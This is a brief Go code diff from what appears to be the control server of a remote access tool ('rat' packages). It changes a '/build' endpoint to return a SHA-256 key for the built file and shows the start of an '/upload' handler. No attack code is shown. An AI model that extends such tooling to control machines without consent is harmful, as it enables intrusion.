@@ -7,6 +7,7 @@ import (
 	"log"
 	"net/http"
 	"rat/command/build"
+	"rat/command/utils"
 	"rat/common"
 	"strconv"
 )
@@ -18,6 +19,13 @@ type TempFile struct {
 
 // TempFiles contains mappings to downloaded files in temporary directory
 var TempFiles map[string]TempFile
+
+func addDownload(tf TempFile) string {
+	tempKey := utils.Sha256(tf.Path)
+	TempFiles[tempKey] = tf
+
+	return tempKey
+}
 
 type ClientPage struct {
 	*Client
@@ -60,12 +68,18 @@ func main() {
 		decoder := json.NewDecoder(r.Body)
 		var config build.Config
 		decoder.Decode(&config)
-		err := build.Build(&config, w)
+		path, err := build.Build(&config, w)
 
 		if err != nil {
 			fmt.Println("build:", err.Error())
-			w.Write([]byte(err.Error()))
+			return
 		}
+
+		tempKey := addDownload(TempFile{
+			Path: path,
+		})
+
+		w.Write([]byte(tempKey))
 	})
 	http.HandleFunc("/upload", func(w http.ResponseWriter, r *http.Request) {
 		dir := r.PostFormValue("directory")
